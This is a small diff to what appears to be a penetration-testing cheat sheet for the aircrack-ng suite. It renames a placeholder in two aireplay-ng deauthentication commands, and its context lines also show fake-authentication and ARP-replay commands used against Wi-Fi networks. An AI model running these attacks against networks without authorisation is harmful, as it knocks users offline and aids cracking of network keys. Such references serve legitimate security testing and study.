@@ -115,7 +115,7 @@ aireplay-ng -1 0 -e <ESSID> -b <BSSID> -h <ATTACK INT MAC> <INT>
 aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>
 
 #Deauth Attack
-aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <DEST MAC> <INT>
+aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <CLIENT MAC> <INT>
 
 **aircrack-ng**
 
@@ -173,7 +173,7 @@ TAB2
 
 -Deauth
 
-aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <DEST MAC> <INT>
+aireplay-ng -0 <NUM OF DEAUTH> -a <BSSID> -c <CLIENT MAC> <INT>
 
 TAB3
 
